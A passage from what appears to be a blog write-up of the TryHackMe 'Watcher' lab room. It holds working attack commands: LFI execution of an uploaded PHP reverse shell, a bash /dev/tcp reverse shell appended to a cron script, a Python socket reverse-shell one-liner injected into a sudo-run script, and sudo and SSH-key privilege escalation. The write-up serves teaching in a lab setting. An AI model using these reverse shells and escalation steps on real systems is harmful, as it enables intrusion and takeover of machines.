<span class="kd">function</span> <span class="kd">printit</span> <span class="o">(</span>$string<span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="err">!</span>$daemon<span class="o">)</span> <span class="o">{</span>
                <span class="nb">print</span> <span class="s2">"$string\n"</span><span class="o">;</span>
        <span class="o">}</span>
<span class="o">}</span>

<span class="o">?&gt;</span> 

</pre></td></tr></tbody></table></code></div></div>
<p>Let’s Upload :</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/thm_watcher/bg_8.png" alt="img" /></p>

<p>After doing that you must set netcat <code class="language-plaintext highlighter-rouge">nc -lvnp 4444</code> for shell and we can go to file upload in <code class="language-plaintext highlighter-rouge">http://10.10.35.205/post.php?post=../../../../../home/ftpuser/ftp/files/php-reverse-shell.php</code>.</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/thm_watcher/bg_9.png" alt="img" /></p>

<p>So now we have shell of webserver, then we get flag_3.txt.</p>

<h3 id="flag-3">Flag 3</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>www-data@watcher:$ cd /var/www/html/more_secrets_a9f10a
www-data@watcher:/var/www/html/more_secrets_a9f10a$ ls
flag_3.txt
www-data@watcher:/var/www/html/more_secrets_a9f10a$ cat flag_3.txt
cat flag_3.txt
FLAG{l------------y}
</pre></td></tr></tbody></table></code></div></div>
<p>Then i’m check the privilage with sudo -l and here is the output:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>www-data on watcher:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User www-data may run the following commands on watcher:
    <span class="o">(</span>toby<span class="o">)</span> NOPASSWD: ALL
</pre></td></tr></tbody></table></code></div></div>
<p>That you can see, the user www can access user toby and we can change user without using password with this command <code class="language-plaintext highlighter-rouge">sudo -u toby bash</code>.</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/thm_watcher/bg_10.png" alt="img" /></p>

<h3 id="flag-4">Flag 4</h3>

<p>And there is also have flag_4.txt</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>toby@watcher:~$ cat flag_4.txt                                                         
cat flag_4.txt                                                                   
FLAG{c------------e}
</pre></td></tr></tbody></table></code></div></div>
<p>After that we can echo shell to cow.sh, i know it because there is have note.txt and explain the user of mat create cronjob with permision of mat. Now we can put revershell to cow.sh <code class="language-plaintext highlighter-rouge">echo "bash -i &gt;&amp; /dev/tcp/10.2.47.251/1234 0&gt;&amp;1" &gt;&gt; cow.sh</code></p>

<p>Note.txt :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
</pre></td></tr></tbody></table></code></div></div>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/thm_watcher/bg_11.png" alt="img" /></p>

<h3 id="flag-5">Flag 5</h3>

<p>Now we got the shell of user mat from the cronjob and also the flag_5.txt</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>mat@watcher:~$ cat flag_5.txt
cat flag_5.txt
FLAG{li--------------------------ow}
</pre></td></tr></tbody></table></code></div></div>
<p>the user can access script python :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>mat@watcher:~$ sudo -l
sudo -l
Matching Defaults entries for mat on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on watcher:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
</pre></td></tr></tbody></table></code></div></div>

<p>Then there is have some text is note.txt :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
</pre></td></tr></tbody></table></code></div></div>
<p>Now we can change the script and doing Python Library injection with this command :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>import socket,subprocess,os<span class="p">;</span><span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="o">)</span><span class="p">;</span>s.connect<span class="o">((</span><span class="s2">"10.2.47.251"</span>,4242<span class="o">))</span><span class="p">;</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,0<span class="o">)</span><span class="p">;</span> os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,1<span class="o">)</span><span class="p">;</span> os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,2<span class="o">)</span><span class="p">;</span><span class="nv">p</span><span class="o">=</span>subprocess.call<span class="o">([</span><span class="s2">"/bin/sh"</span>,<span class="s2">"-i"</span><span class="o">])</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/thm_watcher/bg_12.png" alt="img" /></p>

<h3 id="flag-6">Flag 6</h3>

<p>Then run this with user will without using any password. <code class="language-plaintext highlighter-rouge">sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py *</code></p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/thm_watcher/bg_13.png" alt="img" /></p>

<p>Boom! we got the user <code class="language-plaintext highlighter-rouge">will</code> also the flag_6.txt ofcourse :D</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>$ cat flag_6.txt
FLAG{but_i_thought_my_script_was_secure}
</pre></td></tr></tbody></table></code></div></div>
<h2 id="privilage-escalation">Privilage Escalation</h2>

<p>After looking around i found <code class="language-plaintext highlighter-rouge">/opt/backups/key.bs64</code> and this is base64 encoded</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/thm_watcher/bg_14.png" alt="img" /></p>

<p>We can decode it :</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/thm_watcher/bg_15.png" alt="img" /></p>

<h3 id="last-flag">Last Flag</h3>

<p>Then there is id_rsa key. we can access root now with the key we found.</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/thm_watcher/bg_16.png" alt="img" /></p>

<p>Boom we are root now and having a the last of flag.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>root@watcher:~# cat flag_7.txt 
FLAG{wh--------------------rs}
</pre></td></tr></tbody></table></code></div></div>

<p>so that’s all the writeup that I made now we have 7 flags, including root flag.
Take care and Happy hacking :D</p>


      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        
        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/categories/writeup/'>Writeup</a>,
            <a href='/categories/tryhackme/'>Tryhackme</a>,
            <a href='/categories/linux/'>Linux</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/tags/boot2root/"
            class="post-tag no-text-decoration" >boot2root</a>
          
          <a href="/tags/lfi/"
            class="post-tag no-text-decoration" >lfi</a>
          
          <a href="/tags/medium-box/"
            class="post-tag no-text-decoration" >medium-box</a>
          
          <a href="/tags/privilage-escalation/"
            class="post-tag no-text-decoration" >privilage escalation</a>
          
          <a href="/tags/web-exploitation/"
            class="post-tag no-text-decoration" >web exploitation</a>
          
          <a href="/tags/enumeration/"
            class="post-tag no-text-decoration" >enumeration</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          
          <div class="license-wrapper">
            This post is licensed under
            <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
            by the author.
          </div>
          

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Tryhackme Watcher - Razor-Sec&url=/posts/writeup-tryhackme-watcher/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Tryhackme Watcher - Razor-Sec&u=/posts/writeup-tryhackme-watcher/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://telegram.me/share?text=Tryhackme Watcher - Razor-Sec&url=/posts/writeup-tryhackme-watcher/" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    
      
        <a href="https://www.linkedin.com/sharing/share-offsite/?url=/posts/writeup-tryhackme-watcher/" data-toggle="tooltip" data-placement="top"
          title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin">
          <i class="fa-fw fab fa-linkedin"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink()"
        data-toggle="tooltip" data-placement="top" title="Copy link"></i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->

<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

  















  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/tags/boot2root/">boot2root</a>
      
        
        <a class="post-tag" href="/tags/privilage-escalation/">privilage escalation</a>
      
        
        <a class="post-tag" href="/tags/medium-box/">medium-box</a>
      
        
        <a class="post-tag" href="/tags/web-exploitation/">web exploitation</a>
      
        
        <a class="post-tag" href="/tags/cve/">cve</a>
      
        
        <a class="post-tag" href="/tags/enumeration/">enumeration</a>
      
        
        <a class="post-tag" href="/tags/custom-exploitation/">custom exploitation</a>
      
        
        <a class="post-tag" href="/tags/easy-box/">easy-box</a>
      
        
        <a class="post-tag" href="/tags/lfi/">lfi</a>
      
        
        <a class="post-tag" href="/tags/reversing-binary/">reversing binary</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  
    <!-- BS-toc.js will be loaded at medium priority -->
    <script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
      <span class="pl-3 pt-2 mb-2">Contents</span>
      <nav id="toc" data-toggle="toc"></nav>
    </div>
  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/writeup-tryhackme-en-pass/">
          <div class="card-body">
            <!--
  Date format snippet
-->





<span class="timeago small"
  >

  
  

  
    Feb 14
  

  <i class="unloaded">2021-02-14T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tryhackme En-pass</h3>
            <div class="text-muted small">
              <p>
                





                Introduction
This is partical room from tryhackme entitled En-pass with Medium difficulty. In this room we will learn about web exploitation and privilage escalation . room link here

Enumeration

...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/writeup-tryhackme-inferno/">
          <div class="card-body">
            <!--
  Date format snippet
-->





<span class="timeago small"
  >

  
  

  
    Feb 16
  

  <i class="unloaded">2021-02-16T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tryhackme Inferno</h3>
            <div class="text-muted small">
              <p>
                





                Introduction
This is partical room from Tryhackme entitled Inferno with Medium difficulty. In this room we will learn about exploit HTTP basic auth and IDE Exploit and Linux Privilage escalation . ...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/writeup-tryhackme-The-Great-Escape/">
          <div class="card-body">
            <!--
  Date format snippet
-->





<span class="timeago small"
  >

  
  

  
    Feb 19
  

  <i class="unloaded">2021-02-19T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tryhackme The Great Escape</h3>
            <div class="text-muted small">
              <p>
                





                Introduction
This is partical room from tryhackme entitled “The Great Escape” with Medium difficulty. In this room we will learn about SSRF along with code injection, Port Knocking, Enumeration of ...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/writeup-tryhackme-The-Great-Escape/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Tryhackme The Great Escape</p>
  </a>
  

  
  <a href="/posts/writeup-tryhackme-magician/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Tryhackme Magician</p>
  </a>
  

</div>


    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



  <!--
  image lazy load: https://github.com/ApoorvSaxena/lozad.js
-->
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script>

<script type="text/javascript">
  const imgs = document.querySelectorAll('.post-content img');
  const observer = lozad(imgs);
  observer.observe();
</script>




        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2021
        <a href="https://twitter.com/username">Razor</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        Powered by
        <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
        with
        <a href="https://github.com/cotes2020/jekyll-theme-chirpy"
          target="_blank" rel="noopener">Chirpy</a>
        theme.
      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-xl-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/tags/boot2root/">boot2root</a>
      
        
        <a class="post-tag" href="/tags/privilage-escalation/">privilage escalation</a>
      
        
        <a class="post-tag" href="/tags/medium-box/">medium box</a>
      
        
        <a class="post-tag" href="/tags/web-exploitation/">web exploitation</a>
      
        
        <a class="post-tag" href="/tags/cve/">cve</a>
      
        
        <a class="post-tag" href="/tags/enumeration/">enumeration</a>
      
        
        <a class="post-tag" href="/tags/custom-exploitation/">custom exploitation</a>
      
        
        <a class="post-tag" href="/tags/easy-box/">easy box</a>
      
        
        <a class="post-tag" href="/tags/lfi/">lfi</a>
      
        
        <a class="post-tag" href="/tags/reversing-binary/">reversing binary</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    <div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div>    <div><i class="fa fa-tag fa-fw"></i>{tags}</div>  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>'
});
</script>


  </body>

</html>

